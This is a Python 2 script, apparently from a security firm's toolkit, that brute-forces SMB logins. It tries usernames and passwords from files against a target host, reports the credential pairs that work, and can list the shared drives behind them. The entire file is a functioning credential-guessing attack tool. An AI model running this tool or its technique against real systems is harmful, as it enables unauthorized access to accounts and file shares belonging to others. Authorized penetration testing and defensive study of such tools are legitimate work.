#!/usr/bin/env python2
#copyright 2014 curesec gmbh, ping@curesec.com

import argparse
import netaddr
import socket
import sys

import smb.base
from smb.SMBConnection import SMBConnection



# https://pythonhosted.org/pysmb/api/smb_SharedDevice.html
def list_smb_shares(conn, timeout):
	for share in conn.listShares(timeout):
		if share.type == smb.base.SharedDevice.DISK_TREE:
			share_type_name = "Disk"
		elif share.type == smb.base.SharedDevice.PRINT_QUEUE:
			share_type_name = "Printer"
		elif share.type == smb.base.SharedDevice.COMM_DEVICE:
			share_type_name = "Comm Device"
		elif share.type == smb.base.SharedDevice.IPC:
			share_type_name = "IPC"
		else:
			# should not happen
			share_type_name = ""
		print "share: %s" % share.name
		print "   comments: %s" % share.comments
		print "   type: %s" % share_type_name
		print "   isSpecial: %s" % share.isSpecial
		print "   isTemporary: %s" % share.isTemporary




def run_brute_force(username, password, args):
	ip = args.ip
	port = args.port
	domain = args.domain
	list_shares = args.list_shares
	timeout = args.timeout
	verbose = args.verbose

	client_name = "client"
	server_name = ip
	if port == 445:
		is_direct_tcp = True
	else:
		is_direct_tcp = False

	try:
		# def __init__(self, username, password, my_name, remote_name, domain = '', use_ntlm_v2 = True, sign_options = SIGN_WHEN_REQUIRED, is_direct_tcp = False)
		conn = SMBConnection(username, password, client_name, server_name, domain = domain, use_ntlm_v2 = True, is_direct_tcp = is_direct_tcp)
		smb_authentication_successful = conn.connect(ip, port, timeout = timeout)
		if smb_authentication_successful:
			print "success: [%s:%s]" % (username, password)
			if list_shares:
				list_smb_shares(conn, timeout)
		else:
			if verbose:
				print "failed: [%s:%s]" % (username, password)
	except:
		if verbose:
			e = sys.exc_info()
			print "%s" % str(e)
	finally:
		if conn:
			conn.close()


def parse_passwords(username, args):
	if args.password != None:
		run_brute_force(username, args.password, args)
	elif args.passwordfile:
		passwordfile = open(args.passwordfile, "r")
		for password in passwordfile:
			password = password.strip()
			run_brute_force(username, password, args)
		passwordfile.close()


def parse_usernames(args):
	if args.username != None:
		parse_passwords(args.username, args)
	elif args.userfile:
		userfile = open(args.userfile, "r")
		for username in userfile:
			username = username.strip()
			parse_passwords(username, args)
		userfile.close()


def main():
	parser_description = 	"Brute forcing does not work properly if unauthorized logins\n" +\
				"are mapped  to guest logins. This might happen on Windows XP\n" +\
				"and on Linux systems  when \"map to guest\" is enabled."
	parser = argparse.ArgumentParser(description = parser_description, formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument("-ip", action="store", dest="ip", required=True, help="e.g. 192.168.0.1")
	parser.add_argument("-port", action="store", dest="port", required=True, type=int, help="e.g. 139")
	group1 = parser.add_mutually_exclusive_group(required=True)
	group1.add_argument("-username", action="store", dest="username", help="e.g. administrator")
	group1.add_argument("-userfile", action="store", dest="userfile", help="e.g. users.txt")
	group2 = parser.add_mutually_exclusive_group(required=True)
	group2.add_argument("-password", action="store", dest="password", help="e.g. secret")
	group2.add_argument("-passwordfile", action="store", dest="passwordfile", help="e.g. passwords.txt")
	parser.add_argument("-domain", action="store", dest="domain", default="", required=False, help="e.g. WORKGROUP")
	parser.add_argument("-listshares", action="store_true", dest="list_shares", default=False, required=False, help="list SMB shares")
	parser.add_argument("-timeout", action="store", dest="timeout", type=int, default=5, required=False, help="default 5")
	parser.add_argument("-v", action="store_true", dest="verbose", default=False, required=False)
	args = parser.parse_args()

	parse_usernames(args)


if __name__ == '__main__':
	main()
